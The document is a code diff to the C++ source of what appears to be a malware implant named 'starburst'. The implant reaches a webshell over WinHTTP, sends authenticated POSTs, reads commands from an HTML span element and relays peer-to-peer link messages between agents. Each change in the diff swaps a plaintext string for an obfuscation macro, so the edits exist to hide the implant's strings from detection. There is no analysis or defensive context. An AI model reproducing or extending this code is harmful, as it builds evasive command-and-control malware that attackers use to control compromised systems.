@@ -21,7 +21,7 @@ auto declfn starburst::ws_resolve_winhttp(
 
     memory::zero( &state->http, sizeof( WebshellHttpApis ) );
 
-    char dll_name[] = { 'w','i','n','h','t','t','p','.','d','l','l', 0 };
+    xstr(dll_name, "winhttp.dll");
     state->h_winhttp = inst.kernel32.LoadLibraryA( dll_name );
     if ( !state->h_winhttp ) return false;
 
@@ -64,7 +64,7 @@ auto declfn starburst::ws_resolve_winhttp(
     }
 
     state->h_session = state->http.pWinHttpOpen(
-        symbol<const wchar_t*>( L"Mozilla/5.0" ),
+        XWSTR( L"Mozilla/5.0" ),
         WS_ACCESS_TYPE_DEFAULT_PROXY,
         nullptr, nullptr, 0
     );
@@ -170,7 +170,7 @@ static auto declfn ws_extract_span(
     *content_len = 0;
 
     // search for: <span id="r">
-    char marker[] = { '<','s','p','a','n',' ','i','d','=','"','r','"','>', 0 };
+    xstr(marker, "<span id=\"r\">");
     uint32_t marker_len = 13;
 
     uint8_t* start = nullptr;
@@ -190,7 +190,7 @@ static auto declfn ws_extract_span(
     if ( !start ) return false;
 
     // find closing </span>
-    char close[] = { '<','/','s','p','a','n','>', 0 };
+    xstr(close, "</span>");
     uint32_t close_len = 7;
     uint32_t remaining = html_len - static_cast<uint32_t>( start - html );
 
@@ -312,7 +312,7 @@ auto declfn starburst::ws_http_post(
     uint32_t req_flags = parsed.use_ssl ? WS_FLAG_SECURE : 0;
     auto h_req = state->http.pWinHttpOpenRequest(
         h_conn,
-        symbol<const wchar_t*>( L"POST" ),
+        XWSTR( L"POST" ),
         wide_path,
         nullptr, nullptr, nullptr,
         req_flags
@@ -336,7 +336,7 @@ auto declfn starburst::ws_http_post(
     // Content-Type header
     if ( state->http.pWinHttpAddRequestHeaders ) {
         state->http.pWinHttpAddRequestHeaders( h_req,
-            symbol<const wchar_t*>( L"Content-Type: application/x-www-form-urlencoded" ),
+            XWSTR( L"Content-Type: application/x-www-form-urlencoded" ),
             static_cast<uint32_t>( -1 ),
             WS_ADDREQ_FLAG_ADD | WS_ADDREQ_FLAG_REPLACE );
     }
@@ -348,9 +348,9 @@ auto declfn starburst::ws_http_post(
         uint32_t hdr_len = 8 + an_len + 1 + av_len; // "Cookie: " + name + "=" + value
         auto hdr_buf = static_cast<char*>( inst.heap_alloc( hdr_len + 1 ) );
         if ( hdr_buf ) {
-            str_copy( hdr_buf, symbol<char*>( const_cast<char*>( "Cookie: " ) ) );
+            str_copy( hdr_buf, XSTR( "Cookie: " ) );
             str_concat( hdr_buf, link->auth_name );
-            str_concat( hdr_buf, symbol<char*>( const_cast<char*>( "=" ) ) );
+            str_concat( hdr_buf, XSTR( "=" ) );
             str_concat( hdr_buf, link->auth_value );
             auto wide_hdr = static_cast<wchar_t*>(
                 inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
@@ -371,7 +371,7 @@ auto declfn starburst::ws_http_post(
         auto hdr_buf = static_cast<char*>( inst.heap_alloc( hdr_len + 1 ) );
         if ( hdr_buf ) {
             str_copy( hdr_buf, link->auth_name );
-            str_concat( hdr_buf, symbol<char*>( const_cast<char*>( ": " ) ) );
+            str_concat( hdr_buf, XSTR( ": " ) );
             str_concat( hdr_buf, link->auth_value );
             auto wide_hdr = static_cast<wchar_t*>(
                 inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
@@ -490,7 +490,7 @@ auto declfn starburst::ws_poll_links(
         }
 
         // send poll_p2p|heartbeat
-        char poll_cmd[] = { 'p','o','l','l','_','p','2','p','|','h','e','a','r','t','b','e','a','t', 0 };
+        xstr(poll_cmd, "poll_p2p|heartbeat");
         uint32_t poll_len = 18;
 
         uint8_t* resp     = nullptr;
@@ -564,7 +564,7 @@ auto declfn starburst::ws_poll_links(
                 if ( dpkg ) {
                     package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                     package_add_string( inst, dpkg, cur->agent_id ?
-                        cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
+                        cur->agent_id : XSTR( "" ) );
                     package_add_bytes( inst, dpkg, p2p_data, p2p_len );
 
                     uint32_t dlen = 0;
@@ -639,7 +639,7 @@ auto declfn starburst::ws_link_send_msg(
             if ( dpkg ) {
                 package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                 package_add_string( inst, dpkg, link->agent_id ?
-                    link->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
+                    link->agent_id : XSTR( "" ) );
                 package_add_bytes( inst, dpkg, resp, resp_len );
 
                 uint32_t dlen = 0;
